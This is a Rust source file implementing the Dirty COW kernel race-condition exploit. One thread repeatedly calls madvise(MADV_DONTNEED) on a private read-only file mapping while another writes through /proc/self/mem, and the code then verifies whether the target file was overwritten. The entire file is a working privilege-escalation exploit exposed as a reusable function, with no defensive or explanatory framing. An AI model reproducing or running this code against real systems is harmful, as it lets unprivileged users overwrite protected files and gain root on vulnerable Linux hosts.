//! Race condition exploit for Dirty COW
//!
//! Two threads race:
//! 1. Writer: writes via /proc/self/mem
//! 2. Advisor: calls madvise(MADV_DONTNEED)
//!
//! The race causes the COW page to be discarded, allowing
//! the write to go directly to the file's page cache.

use std::fs::{File, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};
use std::os::unix::io::AsRawFd;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use log::{info, debug, warn};

/// Number of race iterations (higher = more likely to succeed)
const RACE_ITERATIONS: usize = 100_000_000;

/// Execute the Dirty COW race condition
pub fn execute(target: &str, offset: usize, data: &[u8]) -> Result<(), String> {
    info!("[Race] Target: {}, Offset: {}, Data: {} bytes", target, offset, data.len());

    // Step 1: Open target file read-only
    let file = File::open(target)
        .map_err(|e| format!("Open {}: {}", target, e))?;
    
    let file_size = file.metadata()
        .map_err(|e| format!("Stat: {}", e))?.len() as usize;

    if offset + data.len() > file_size {
        return Err("Write would exceed file size".into());
    }

    // Step 2: Map file into memory with MAP_PRIVATE (triggers COW on write)
    let map_ptr = unsafe {
        libc::mmap(
            std::ptr::null_mut(),
            file_size,
            libc::PROT_READ,      // Read-only mapping
            libc::MAP_PRIVATE,    // Private = COW semantics
            file.as_raw_fd(),
            0
        )
    };

    if map_ptr == libc::MAP_FAILED {
        return Err(format!("mmap failed: {}", std::io::Error::last_os_error()));
    }

    // Cast pointer to usize for thread-safe transfer
    // Raw pointers are not Send, but usize is
    let map_addr = map_ptr as usize;
    let target_addr = map_addr + offset;
    let data_clone = data.to_vec();
    let file_size_copy = file_size;
    
    debug!("[Race] Mapped at 0x{:x}, target addr 0x{:x}", map_addr, target_addr);

    // Shared stop flag
    let stop = Arc::new(AtomicBool::new(false));
    let stop1 = stop.clone();
    let stop2 = stop.clone();

    // Thread 1: madvise(MADV_DONTNEED) loop
    // This tells kernel to discard the page, forcing re-fetch
    let madvise_thread = thread::spawn(move || {
        let ptr = map_addr as *mut libc::c_void; // Reconstruct pointer
        let mut count = 0;
        for _ in 0..RACE_ITERATIONS {
            if stop1.load(Ordering::Relaxed) { break; }
            unsafe {
                libc::madvise(ptr, file_size_copy, libc::MADV_DONTNEED);
            }
            count += 1;
        }
        debug!("[Race] madvise iterations: {}", count);
    });

    // Thread 2: Write via /proc/self/mem
    // This bypasses normal permission checks and writes to the mapped address
    let write_thread = thread::spawn(move || {
        let mut mem = match OpenOptions::new().read(true).write(true).open("/proc/self/mem") {
            Ok(f) => f,
            Err(e) => {
                warn!("[Race] Cannot open /proc/self/mem: {}", e);
                return;
            }
        };

        let mut count = 0;
        for _ in 0..RACE_ITERATIONS {
            if stop2.load(Ordering::Relaxed) { break; }
            
            // Seek to target address
            if mem.seek(SeekFrom::Start(target_addr as u64)).is_err() {
                continue;
            }
            
            // Attempt write (this triggers the race)
            if mem.write_all(&data_clone).is_ok() {
                count += 1;
            }
        }
        debug!("[Race] write iterations with success: {}", count);
    });

    // Wait for threads to complete
    let _ = madvise_thread.join();
    stop.store(true, Ordering::Relaxed);
    let _ = write_thread.join();

    // Cleanup mapping
    unsafe {
        libc::munmap(map_ptr, file_size);
    }

    // Verify: Read file to check if overwrite succeeded
    let mut verify_file = File::open(target)
        .map_err(|e| format!("Verify open: {}", e))?;
    
    let mut verify_buf = vec![0u8; data.len()];
    verify_file.seek(SeekFrom::Start(offset as u64))
        .map_err(|e| format!("Verify seek: {}", e))?;
    verify_file.read_exact(&mut verify_buf)
        .map_err(|e| format!("Verify read: {}", e))?;

    if verify_buf == data {
        info!("[Race] SUCCESS: File overwritten!");
        Ok(())
    } else {
        warn!("[Race] Race failed, file unchanged");
        Err("Race condition did not succeed".into())
    }
}

